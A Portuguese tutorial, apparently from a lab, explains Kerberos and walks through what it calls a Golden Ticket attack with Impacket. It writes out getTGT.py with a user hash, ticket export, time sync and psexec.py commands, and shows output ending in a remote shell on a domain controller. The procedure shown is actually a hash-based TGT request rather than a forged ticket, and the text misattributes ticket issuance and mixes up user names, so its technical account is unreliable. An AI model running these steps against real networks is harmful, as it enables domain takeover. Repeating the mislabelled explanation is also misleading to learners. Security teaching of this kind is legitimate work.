# Golden Ticket.

Bom, para iniciarmos o nosso estudo sobre **Golden Ticket**, nós vamos definir o processo do aprendizado em etapas:

1. **O que é Kerberos?**
2. **O que é um Ticket?**
3. **Como isso funciona?**
4. **O que é ataque de Golden Ticket?**
5. **O que é Impacket?**
6. **Como faço o ataque?**

---

Iniciando pela primeira etapa, vamos definir o que é **Kerberos**. O mesmo se trata de um **protocolo de rede** onde fornece **autenticação** ao usuário solicitado. O foco da criação do Kerberos foi tratar de maneira segura a autenticação do usuário na rede.

Com a intenção de tratar de maneira segura a autenticação de um usuário na rede, o Kerberos utiliza de uma feature chamada de **Ticket**. O Ticket irá funcionar para verificar e autorizar a autenticidade daquele usuário, comprovando de que aquele usuário é de fato ele mesmo. 

Em um ambiente de **Active Directory**, todo Domain Controller (DC) possui um centro de distribuição de Kerberos, ou **Kerberos Distribution Center** (KDC), serviço que processa todas as requisições para o Kerberos. Com isso, há uma conta chamada **KRBTGT**, usuário responsável para atuar como uma conta serviço para o KDC. É ela que irá assinar/criptografar tickets emitidos pelo KDC.

Outro componente importante é o **Authentication Server** (AS). É nele que ocorre a verificação do cliente. Caso a verificação seja concluída com êxito, ele retorna para o usuário um ticket chamado **TGT** (Ticket Granting Ticket) ****e uma chave de sessão.

O **TGT** é o ticket utilizado para confirmar que o usuário foi de fato autenticado com sucesso. Outro componente importante do processo é o **TGS** (Ticket Granting Server). É exatamente o **TGS** que permitirá que o usuário acesse os serviços da rede. Abaixo, há uma ilustração de como ocorre o processo:

![Untitled](Golden%20Ticket%20df4f87a4d2a1485c998a5ac79970188d/Untitled.png)

Como vimos, o cliente (usuário legítimo) envia o seu usuário para o **AS** (Authentication Server), e o mesmo retorna uma chave de sessão e o Ticket (**TGT**). Com o TGT em mãos, o cliente retorna para o AS o TGT e uma requisição para o serviço que ele quer usar. Caso o TGT for válido, o AS irá retornar para o cliente o Ticket que permitirá ele utilizar os serviços da rede. Feito isso, o usuário conseguirá utilizar os serviços da rede. 

Como vimos, o AS retorna para o usuário a chave de sessão e o TGT para confirmar que de fato ele foi autenticado na rede e que ele é de fato quem ele diz ser. Mas, caso burlássemos esse mecanismo e forjássemos o TGT para se passar por outro usuário, o que aconteceria? Elevaríamos privilégios no sistema? A resposta é sim, e o nome disso é ataque de **Golden Ticket**.    

O **Impacket** é uma coleção de scripts feitos em python, sendo possível ser encontrada no [GitHub](https://github.com/SecureAuthCorp/impacket), focadas em invasões em protocolos de redes comumente em ambientes **Windows**. Nessa coleção, é encontrada o que precisamos para realizar o ataque de **Golden Ticket**. Vamos pra prática? 🐙

---

Com isso, avançamos para a primeira etapa do ataque: **a criação do Ticket**. Para criarmos nosso **TGT**, utilizamos o script **[getTGT.py](http://getTGT.py)** para forjarmos o TGT e criarmos um com um usuário com um privilégio maior que o nosso (no meu caso, vai ser o usuário web_svc que possui privilégio de administrador). 

O que fizemos abaixo foi rodar o script “**getTGT.py**” (disponível no Impacket), especificar a **hash** do usuário, o domínio da vítima e o nome de usuário.

![Untitled](Golden%20Ticket%20df4f87a4d2a1485c998a5ac79970188d/Untitled%201.png)

```python
#python2 getTGT.py -hashes :acd9325ab546d6870e3d490684cfe305 relay.uhclabs/svc_webapp

python2 getTGT.py -hashes :HASH_DO_USUARIO DOMAIN/USUARIO
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Saving ticket in svc_webapp.ccache
```

Com isso, agora nós exportamos para nosso [localhost](http://localhost) o Ticket gerado pelo script com o seguinte comando:

```bash
#export KRB5CCNAME=svc_webapp.ccache
export KRB5CCNAME=TICKET_GERADO
```

Agora, nós sincronizamos nosso horário com o da máquina com esse comando (tal fato se deve pelo **Timestamp** do Ticket gerado. É este Timestamp que vai realizar a marcação do tempo atual do servidor, por isso a sincronização com o horário.):

```bash
# sudo ntpdate 172.31.28.153
sudo ntpdate IP_DA_MAQUINA_ALVO
```

Abaixo, especificamos o domínio da máquina, o usuário que forjamos o Ticket, o nome do **Domain Controller** (DC) e dois argumentos essenciais: “-k” e “-no-pass”. O “-k” vem de “**Kerberos Authentication**”, onde o mesmo vai utilizar o “.ccache” que nós geramos com o script **getTGT.py**. E o “-no-pass” simplesmente é para não perguntar a senha. 

E finalmente, vamos pegar a shell! Vamos utilizar o psexec e passar o nosso Ticket forjado para nos autenticarmos no serviço!

```python
#python2 psexec.py relay.uhclabs/svc_webapp@EC2AMAZ-HDQ6ICO.RELAY.UHCLABS -k -no-pass
python2 psexec.py DOMAIN/USUARIO@DOMAIN_CONTROLLER -k -no-pass
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on EC2AMAZ-HDQ6ICO.RELAY.UHCLABS.....
[*] Found writable share ADMIN$
[*] Uploading file SgxvJTis.exe
[*] Opening SVCManager on EC2AMAZ-HDQ6ICO.RELAY.UHCLABS.....
[*] Creating service apKU on EC2AMAZ-HDQ6ICO.RELAY.UHCLABS.....
[*] Starting service apKU.....
[!] Press help for extra shell commands
```

E assim, conseguimos realizar um ataque de Golden Ticket!

![Untitled](Golden%20Ticket%20df4f87a4d2a1485c998a5ac79970188d/Untitled%202.png)